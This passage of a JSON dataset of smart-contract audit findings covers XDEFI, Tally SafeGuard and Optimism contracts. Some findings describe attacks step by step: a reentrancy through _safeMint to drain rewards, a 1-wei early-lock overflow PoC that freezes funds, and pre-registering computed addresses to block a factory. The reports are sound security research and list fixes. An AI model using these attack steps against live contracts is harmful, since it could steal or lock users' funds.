resolved](https://github.com/code-423n4/2022-01-xdefi-findings/issues/25#issuecomment-1008233320):**\n> Valid and a big issue. However, due to other recommendations, I will not solve it this way. Instead, `updateDistribution()` will be called at the start of every lock/unlock function (so it can't have a `noReenter` modifier), and the `_safeMint` calls will be moved to the end of their respective operations to prevent the effect of the re-entrancy (i.e. position will created with a `_pointsPerUnit` before a re-entering from `_safeMint` can affect it). Tests will be added to show this is not longer possible.\n\n**[deluca-mike (XDEFI) commented](https://github.com/code-423n4/2022-01-xdefi-findings/issues/25#issuecomment-1012774852):**\n> In our release candidate contract, as mentioned above, `updateDistribution()` is called before each locking and unlocking function, via a [`updatePointsPerUnitAtStart` modifier](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L77-L80), and thus, `updateDistribution()` is now a public fucntion, and since it is used by other functions, cannot be behind a `noReenter`.\n> \n> See:\n> - [`lock`](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L177)\n> - [`lockWithPermit`](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L181)\n> - [`relock`](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L188)\n> - [`unlock`](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L195)\n> - [`relockBatch`](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L233)\n> - [`unlockBatch`](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L240)\n> \n> Also, [a test was written](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/test/XDEFIDistributionReceivers.js) to ensure that this is no longer exploitable, and that the contract behaves properly if a re-entrancy call `updateDistribution()`.\n\n**[Ivshti (Judge) commented](https://github.com/code-423n4/2022-01-xdefi-findings/issues/25#issuecomment-1013783009):**\n> Agreed with the severity.\n> \n> Resolution of reordering the calls seems to be adequate \n\n\n\n \n",
      "summary": "\nThis bug report is about a reentrancy vulnerability in the _safeMint function of the XDEFIDistribution.sol contract. This function is called by the lock function which changes the totalDepositedXDEFI variable. Since the updateDistribution function does not have the noReenter modifier, an attacker can re-enter the updateDistribution function in the _safeMint function. This will cause the _pointsPerUnit variable to become abnormally large and the attacker can call the lock function to get an NFT before exploiting the reentrance vulnerability. The attacker can then call the unlock function to steal a lot of rewards, and the assets deposited by the user using the reentrance vulnerability can also be redeemed by calling the unlock function.\n\nThe recommended mitigation step for this vulnerability is to add the noReenter modifier to the updateDistribution function. This will prevent the attacker from re-entering the updateDistribution function in the _safeMint function and exploiting the vulnerability.",
      "quality_score": 3,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "XDEFI",
      "source_link": "https://code4rena.com/reports/2022-01-xdefi",
      "github_link": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/25",
      "tags": [
        "Reentrancy"
      ],
      "finders": [
        "onewayfunction",
        "tqts",
        "cccz",
        "cmichel",
        "Fitraldys",
        "kenzo"
      ]
    },
    {
      "id": "1254",
      "title": "[H-01] Malicious early user/attacker can malfunction the contract and even freeze users’ funds in edge cases",
      "impact": "HIGH",
      "content": "## Handle\n\nWatchPug\n\n\n## Vulnerability details\n\nhttps://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L151-L151\n\n```solidity\n    _pointsPerUnit += ((newXDEFI * _pointsMultiplier) / totalUnitsCached);\n```\n\nIn the current implementation,  `_pointsPerUnit` can be changed in `updateDistribution()` which can be called by anyone. \n\nA malicious early user can `lock()` with only `1 wei` of XDEFI and makes `_pointsPerUnit` to be very large, causing future users not to be able to `lock()` and/or `unlock()` anymore due to overflow in arithmetic related to `_pointsMultiplier`.\n\nAs a result, the contract can be malfunctioning and even freeze users' funds in edge cases.\n\n### PoC\n\nGiven:\n\n- bonusMultiplierOf[30 days] = 100\n\n1. Alice `lock()` `1 wei` of XDEFI for 30 days as the first user of the contract. Got `1` units, and `totalUnits` now is `1`;\n2. Alice sends `170141183460469 wei` of `XDEFI` to the contract and calls `updateDistribution()`:\n\n```solidity\n    _pointsPerUnit += ((170141183460469 * 2**128) / 1);\n```\n\n3. Bob tries to `lock()` `1,100,000 * 1e18` of `XDEFI` for 30 days, the tx will fail, as `_pointsPerUnit * units` overlows;\n4. Bob `lock()` `1,000,000 * 1e18` of `XDEFI` for 30 days;\n5. The rewarder sends `250,000 * 1e18` of `XDEFI` to the contract and calls `updateDistribution()`: \n\n```solidity\n    _pointsPerUnit += ((250_000 * 1e18 * 2**128) / (1_000_000 * 1e18 + 1));\n```\n\n6. 30 days later, Bob tries to call `unlock()`, the tx will fail, as `_pointsPerUnit * units` overflows. \n\n\n### Recomandation\n\nUniswap v2 solved a similar problem by sending the first 1000 lp tokens to the zero address.\n\nThe same solution should work here, i.e., on constructor set an initial amount (like 1e8) for `totalUnits`  \n\nhttps://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L39-L44\n\n```solidity\nconstructor (address XDEFI_, string memory baseURI_, uint256 zeroDurationPointBase_) ERC721(\"Locked XDEFI\", \"lXDEFI\") {\n        require((XDEFI = XDEFI_) != address(0), \"INVALID_TOKEN\");\n        owner = msg.sender;\n        baseURI = baseURI_;\n        _zeroDurationPointBase = zeroDurationPointBase_;\n\n        totalUnits = 100_000_000;\n    }\n```",
      "summary": "\nThis bug report is about a vulnerability in the XDeFi Distribution contract that can lead to malfunctioning and freezing of user funds. The vulnerability is related to the `_pointsPerUnit` variable, which can be changed by anyone in the `updateDistribution()` function. A malicious early user can take advantage of this by locking a small amount of XDEFI with only 1 wei and increasing the `_pointsPerUnit` value to a very large number, causing future users to be unable to lock or unlock their funds due to overflow in arithmetic related to `_pointsMultiplier`.\n\nA proof-of-concept was provided to illustrate the vulnerability. It demonstrated that if Alice locks 1 wei of XDEFI for 30 days, then Bob will not be able to lock 1,100,000 * 1e18 of XDEFI for 30 days due to the overflow issue.\n\nThe recommendation is to set an initial amount for `totalUnits` on the constructor, similar to the way Uniswap v2 sends the first 1000 lp tokens to the zero address. This should solve the problem.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "XDEFI",
      "source_link": "https://code4rena.com/reports/2022-01-xdefi",
      "github_link": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/156",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "10704",
      "title": "[L05] Useless or repeated code",
      "impact": "LOW",
      "content": "There are places in the codebase where code is either repeated or not needed. Some examples are:\n\n\n* [Lines 29-32](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/Registry.sol#L29-L32) of the `Registry` contract are useless, because the [`_add`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/structs/EnumerableSet.sol#L53) function of the `EnumerableSet` contract [already performs these checks](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/structs/EnumerableSet.sol#L54) against the values already being set.\n* [Lines 62](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/SafeGuard.sol#L62), [67](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/SafeGuard.sol#L67), [73](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/SafeGuard.sol#L73) and [78](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/SafeGuard.sol#L78) of the `SafeGuard` contract are all repeating the same exact operation. Consider encapsulating it into an internal function to avoid duplicating code.\n* [Lines 62-63](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/SafeGuard.sol#L62-L63) and [67-68](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/SafeGuard.sol#L67-L68) of `SafeGuard` are repeated. Consider encapsulating them into a single internal function.\n* The usage of `gasleft` to specify how much gas should be forwarded in the call of the function [`executeTransaction`](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/SafeGuard.sol#L80) is unnecessary. This is because, at that point of execution, the entire gas left will be used to continue the execution. If this is not for expliciteness, consider removing the `gas` parameter from the call.\n\n\nConsider applying the suggested fixed to produce a cleaner code and improve consistency and modularity over the codebase.\n\n\n**Update:** *Fixed in [PR #10](https://github.com/withtally/safeguard/pull/10) and commit [`7fd27df16fc879d990d36a167a0b6e719e578558`](https://github.com/withtally/safeguard/commit/7fd27df16fc879d990d36a167a0b6e719e578558).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Tally SafeGuard Audit",
      "source_link": "https://blog.openzeppelin.com/tally-safeguard-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10703",
      "title": "[L04] Missing docstrings",
      "impact": "LOW",
      "content": "Some of the contracts and functions in the code base lack documentation. For example, [some functions](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/SafeGuard.sol#L61-L91) in the `SafeGuard` contract.\n\n\nAdditionally, some docstrings use informal language, such as the one [above the `setTimelock` function in the `SafeGuard` contract](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/SafeGuard.sol#L52).\n\n\nThis hinders reviewers’ understanding of the code’s intention, which is fundamental to correctly assess not only security but also correctness. Additionally, docstrings improve readability and ease maintenance. They should explicitly explain the purpose or intention of the functions, the scenarios under which they can fail, the roles allowed to call them, the values returned and the events emitted.\n\n\nConsider thoroughly documenting all functions (and their parameters) that are part of the contracts’ public API. Functions implementing sensitive functionality, even if not public, should be clearly documented as well. When writing docstrings, consider following the [Ethereum Natural Specification Format](https://solidity.readthedocs.io/en/develop/natspec-format.html) (NatSpec).\n\n\n**Update:** *Partially fixed in [PR #10](https://github.com/withtally/safeguard/pull/10). Proper docstrings have been added to various functions throughout the code base. However, in addition to the current changes, consider making the following changes:*\n\n\n* *Add `description` as the `@param` in the docstring above `queueTransactionWithDescription` function*\n* *Add `@param` in the [docstring](https://github.com/withtally/safeguard/pull/10/files#diff-1a1b069c8e6fe7253364a4ea0bcb54c383a14c396e168bcc77bf16a29904ded8R76-R78) above the `createSafeGuard` function in `SafeGuardFactory` contract*\n* *Add `@return` in docstrings above the functions in `SafeGuardFactory` contract.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Tally SafeGuard Audit",
      "source_link": "https://blog.openzeppelin.com/tally-safeguard-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10702",
      "title": "[L03] Incorrect interface definition and implementation",
      "impact": "LOW",
      "content": "The [`ISafeGuard`](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/ISafeGuard.sol) interface does not define the [`queueTransactionWithDescription` function](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/SafeGuard.sol#L66) implemented in the `SafeGuard` contract, and at the same time, it defines the [\\_\\_abdicate, \\_\\_queueSetTimelockPendingAdmin and \\_\\_executeSetTimelockPendingAdmin](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/ISafeGuard.sol#L34-L36) functions but they are not implemented.\n\n\nTo improve correctness and consistency in the codebase, consider refactoring the `ISafeGuard` interface to match exactly the `SafeGuard` implementation.\n\n\n**Update:** *Fixed in commit [`7fd27df16fc879d990d36a167a0b6e719e578558`](https://github.com/withtally/safeguard/commit/7fd27df16fc879d990d36a167a0b6e719e578558).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Tally SafeGuard Audit",
      "source_link": "https://blog.openzeppelin.com/tally-safeguard-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10701",
      "title": "[L02] SafeGuard’s admin can assign the role of creator to any address",
      "impact": "LOW",
      "content": "The `SafeGuard` contract defines the role of a [`CREATOR_ROLE`](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/SafeGuard.sol#L16) which, as the name suggests, is assigned to the creator of the safeguard.\n\n\nHowever, by invoking [the `grantRole` function of the `AccessControlEnumerable` contract](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/AccessControlEnumerable.sol#L51-L54) in the OpenZeppelin contract library, an admin can grant this role to any address. This could cause confusion because the [creator of the `SafeGuard` can only be the `SafeGuardFactory`](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/SafeGuardFactory.sol#L36).\n\n\nThroughout the codebase, this role has been used only to restrict users from interacting with the [`setTimelock` function](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/SafeGuard.sol#L55) of the `SafeGuard` contract. By design, the system ensures that `setTimelock` function [can be called only once](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/SafeGuard.sol#L56), from [within the `SafeGuardFactory` contract](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/SafeGuardFactory.sol#L38).\n\n\nConsider removing the `CREATOR_ROLE` role from the `SafeGuard` contract and using the [`onlyOwner` modifier](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol#L41-L44) in the `setTimelock` function.\n\n\n**Update:** *Fixed in [PR #10](https://github.com/withtally/safeguard/pull/10).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Tally SafeGuard Audit",
      "source_link": "https://blog.openzeppelin.com/tally-safeguard-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10700",
      "title": "[L01] Commented out code",
      "impact": "LOW",
      "content": "The `Registry` contract includes [a commented out line of code](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/Registry.sol#L4). To improve readability, consider removing it from the codebase.\n\n\n**Update:** *Fixed in [PR #10](https://github.com/withtally/safeguard/pull/10) and commit [`7fd27df16fc879d990d36a167a0b6e719e578558`](https://github.com/withtally/safeguard/commit/7fd27df16fc879d990d36a167a0b6e719e578558).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Tally SafeGuard Audit",
      "source_link": "https://blog.openzeppelin.com/tally-safeguard-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10699",
      "title": "[H02] SafeGuardFactory can be freezed",
      "impact": "HIGH",
      "content": "The [`Registry`](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/Registry.sol) contract is intended to keep track of all the [`SafeGuards`](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/SafeGuard.sol) that the [`SafeGuardFactory` produces](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/SafeGuardFactory.sol). It has the external [`register` function](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/Registry.sol#L27) which is used for this purpose.\n\n\nAt the same time, the `SafeGuardFactory` has, in its constructor, the assignation of the local [`registry` value to the input value](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/SafeGuardFactory.sol#L28). There’s no possibility to change the value of the `registry` variable and for this reason, if a new `Registry` gets deployed, a new factory must be deployed too.\n\n\nThe `SafeGuardFactory` has the [`createSafeGuard` function](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/SafeGuardFactory.sol#L34), in charge of first [deploying a new `SafeGuard`](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/SafeGuardFactory.sol#L36), then [a new `Timelock`](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/SafeGuardFactory.sol#L37) with the address of the `SafeGuard` as `admin`, [then setting the `timelock` variable of the `SafeGuard`](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/SafeGuardFactory.sol#L38) contract and finally [registering the `SafeGuard` in the registry](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/SafeGuardFactory.sol#L40).\n\n\nThe issue is that any call to `createSafeGuard` can be forced to fail by an attacker who can directly register the deterministic address of the new `SafeGuard` prior to its creation. Whenever a contract [creates a `new` instance](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/SafeGuardFactory.sol#L36), its nonce is increased, and the address of where the new instance of the contract would be deployed can be determined by the original contract address and its nonce. Therefore, an attacker can precalculate many of the addresses where the new `SafeGuards` will be deployed and register those addresses in the `Registry` by calling the `register` function. This would result in the calls to `createSafeGuard` to [revert](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/Registry.sol#L30) since the `Registry` already contains the address.\n\n\nTo avoid having external actors calling publicly the `Register` contract, consider restricting the access to the `register` function to accept calls exclusively by the `SafeGuardFactory`.\n\n\n**Update:** *Fixed in [PR #10](https://github.com/withtally/safeguard/pull/10). The Tally team has removed the `Registry` contract.*",
      "summary": "\nThis bug report describes a vulnerability in the [`Registry`](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/Registry.sol) and [`SafeGuardFactory`](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/SafeGuardFactory.sol) contracts. The `Registry` contract is used to keep track of the `SafeGuards` that the `SafeGuardFactory` produces. The `SafeGuardFactory` has an external `register` function which is used to register the `SafeGuards` in the `Registry`.\n\nThe issue is that an attacker can precalculate the address of the new `SafeGuard` before it is created and register it in the `Registry` using the `register` function. This would result in the calls to `createSafeGuard` to fail since the `Registry` already contains the address. To fix this, the access to the `register` function must be restricted to the `SafeGuardFactory`. This issue has been fixed in [PR #10](https://github.com/withtally/safeguard/pull/10) and the `Registry` contract has been removed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Tally SafeGuard Audit",
      "source_link": "https://blog.openzeppelin.com/tally-safeguard-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10698",
      "title": "[H01] ETH can be locked inside the Timelock contract",
      "impact": "HIGH",
      "content": "The `Tally` team originally based their implementations on the ground of the [`GovernorBravoDelegate`](https://github.com/compound-finance/compound-protocol/blob/master/contracts/Governance/GovernorBravoDelegate.sol) Compound contract.\n\n\nDuring the course of this audit, the `Tally` team discovered [a limitation](https://github.com/compound-finance/compound-protocol/issues/150) in Compound’s governor where ETH sent directly to the `Timelock` is not available for use by governance proposals, and although it is not permanently stuck, requires an elaborate workaround to be retrieved.\n\n\nThis is because the governor implementation requires all the value of a proposal to be attached as `msg.value` by the account that triggers the execution, not using in any way the `Timelock` ETH funds.\n\n\nThe [same issue was later identified in the `SafeGuard` implementation](https://github.com/withtally/safeguard/blob/b2c63a9dfc4090be13320d999e7c6c1d842625d3/contracts/SafeGuard.sol#L80) and the team is aware of the issue and it is in the process of fixing it.\n\n\nWhile fixing the issue, consider using the approach [adopted by the OpenZeppelin library for the same issue](https://github.com/OpenZeppelin/openzeppelin-contracts/pull/2849).\n\n\n**Update:** *Fixed in commit [`7337db227edda83533be586135d96ddac4f5bf29`](https://github.com/withtally/safeguard/commit/7337db227edda83533be586135d96ddac4f5bf29).*",
      "summary": "\nThe Tally team was using the GovernorBravoDelegate contract from Compound to build their implementations. During this audit, they discovered a limitation in Compound’s governor where ETH sent directly to the Timelock was not available for use by governance proposals and required an elaborate workaround to be retrieved. This same issue was later identified in the SafeGuard implementation and the team was in the process of fixing it. They were advised to use the approach adopted by the OpenZeppelin library for the same issue. The issue was later fixed in the commit 7337db227edda83533be586135d96ddac4f5bf29.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Tally SafeGuard Audit",
      "source_link": "https://blog.openzeppelin.com/tally-safeguard-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10750",
      "title": "[L20] Deployment risks",
      "impact": "LOW",
      "content": "The following contracts have a public initializer function:\n\n\n* [`OVM_L1CrossDomainMessenger`](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/bridge/messaging/OVM_L1CrossDomainMessenger.sol#L45)\n* [`Abs_L2DepositedToken`](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/bridge/tokens/Abs_L2DepositedToken.sol#L59)\n* [`OVM_L1ETHGateway`](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/bridge/tokens/OVM_L1ETHGateway.sol#L55)\n* [`OVM_DeployerWhitelist`](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/predeploys/OVM_DeployerWhitelist.sol#L63)\n* [`OVM_ProxySequencerEntrypoint`](https://github.com/ben-chain/contracts-v2/blob/bc2995d9f4f00fb369d1868e81af9197113aaab9/contracts/optimistic-ethereum/OVM/predeploys/OVM_ProxySequencerEntrypoint.sol#L37)\n\n\nIn all cases, the first account to invoke the initializer is not authenticated and can set sensitive parameters, which leaves them open to potential front-running attacks that could invalidate the contracts. We understand that this is particularly relevant for the token bridge contracts, because the Optimism team intends to provide a factory that programmatically creates the contracts and adds them to a registry, so if a particular token bridge is invalidated, it may not be recoverable.\n\n\nOne reason for this pattern is that contracts may have circular deployment dependencies, which means some contracts have to be deployed before their dependencies. Nevertheless, since contract addresses are created deterministically, it should still be possible to predict all addresses before the deployment, and pass them to the relevant constructors. Consider using this method where appropriate to mitigate the risk of front-running during initial configuration transactions. Alternatively, consider implementing access controls to the initializer functions.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10749",
      "title": "[L19] Lack of event emissions",
      "impact": "LOW",
      "content": "* In the `OVM_ProxySequencerEntrypoint` contract, the [`upgrade` function](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/OVM/predeploys/OVM_ProxySequencerEntrypoint.sol#L51) does not emit an event after a successful upgrade operation.\n\n\nConsider emitting events after sensitive changes take place to facilitate tracking and notify off-chain clients following the contracts’ activity.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10748",
      "title": "[L18] Lack of allowance front-running mitigation in ERC20 contract",
      "impact": "LOW",
      "content": "The [`UniswapV2ERC20` contract](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/standards/UniswapV2ERC20.sol) does not include the [`increaseAllowance` and `decreaseAllowance` functions](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0/contracts/token/ERC20/ERC20.sol#L158-L192), nowadays common in most ERC20 interfaces to help mitigate the [allowance frontrunning issue](https://docs.google.com/document/d/1YLPtQxZu1UAvO9cZ1O2RPXBbT0mooh4DYKjA_jp-RLM/edit) of the ERC20 standard.\n\n\nWhile not strictly part of the ERC20 standard, consider including these two functions in the contract’s interface.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10747",
      "title": "[L17] Lookup key strings are not centrally defined",
      "impact": "LOW",
      "content": "Known, legitimate contracts are tracked in the [`addresses` mapping](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/resolver/Lib_AddressManager.sol#L26) of the `Lib_AddressManager` contract. New entries can be added by a privileged address via the [`setAddress` function](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/resolver/Lib_AddressManager.sol#L38), and the [`getAddress` function](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/resolver/Lib_AddressManager.sol#L58) function acts as a public getter to query the registry providing a string-type key. While this registry is used by several different contracts to get the addresses of registered contracts, the strings used as keys to query the registry are not centrally defined. The identified strings are:\n\n\n* `\"OVM_L2MessageRelayer\"`\n* `\"OVM_L2BatchMessageRelayer\"`\n* `\"OVM_StateCommitmentChain\"`\n* `\"OVM_L2CrossDomainMessenger\"`\n* `\"OVM_CanonicalTransactionChain\"`\n* `\"Proxy__OVM_L1CrossDomainMessenger\"`\n* `\"OVM_L1MessageSender\"`\n* `\"OVM_L1CrossDomainMessenger\"`\n* `\"OVM_L2ToL1MessagePasser\"`\n* `\"OVM_ChainStorageContainer:CTC:batches\"`\n* `\"OVM_ChainStorageContainer:CTC:queue\"`\n* `\"OVM_Sequencer\"`\n* `\"OVM_ExecutionManager\"`\n* `\"OVM_DecompressionPrecompileAddress\"`\n* `\"OVM_ChainStorageContainer:SCC:batches\"`\n* `\"OVM_BondManager\"`\n* `\"OVM_StateCommitmentChain\"`\n* `\"OVM_CanonicalTransactionChain\"`\n* `\"OVM_FraudVerifier\"`\n* `\"OVM_Proposer\"`\n* `\"OVM_SafetyChecker\"`\n* `\"OVM_StateTransitionerFactory\"`\n\n\nWhile this issue does not pose an immediate security risk, the approach taken can be considered error-prone and difficult to maintain. Moreover, it is worth noting that the current code base has a number of inconsistencies in how these keys are referenced, as described in **“[N06] Inconsistent name resolution”**.\n\n\nConsider factoring out all mentioned constant strings to a single library, which can be then imported as needed. This will ease maintenance and make the code more resilient to future changes.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10746",
      "title": "[L16] Incorrect parsing of booleans in RLP library",
      "impact": "LOW",
      "content": "The [`readBool` function](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/rlp/Lib_RLPReader.sol#L336) of the `Lib_RLPReader` library converts an RLP-encoded boolean value into a boolean type. The function returns [`false` only if the provided value is `0`](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/rlp/Lib_RLPReader.sol#L361). However, in [Geth](https://github.com/ethereum/go-ethereum/blob/v1.10.2/rlp/encode_test.go#L93) `false` is encoded as `0x80`, not `0x00`. For this encoding of `false`, the `readBool` function would [incorrectly revert](https://github.com/ben-chain/contracts-v2/blob/a935e276f5620b40802b52721e3474232e458f72/contracts/optimistic-ethereum/libraries/rlp/Lib_RLPReader.sol#L356-L359). The flawed behavior can be reproduced by simply attempting to execute `Lib_RLPReader.readBool(Lib_RLPWriter.writeBool(false))`, which currently triggers a revert with message `Invalid RLP boolean value, must be 0 or 1`.\n\n\nConsider updating the implementation of the `readBool` function to check for the case that the input is `0x80` and return `false`accordingly. Alternatively, given that this function is never used, consider removing it from the code base.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Optimism Smart Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/optimism-smart-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10745",
      "title": "[L15] Unnecessary use of assembly",
      "impact": "LOW",
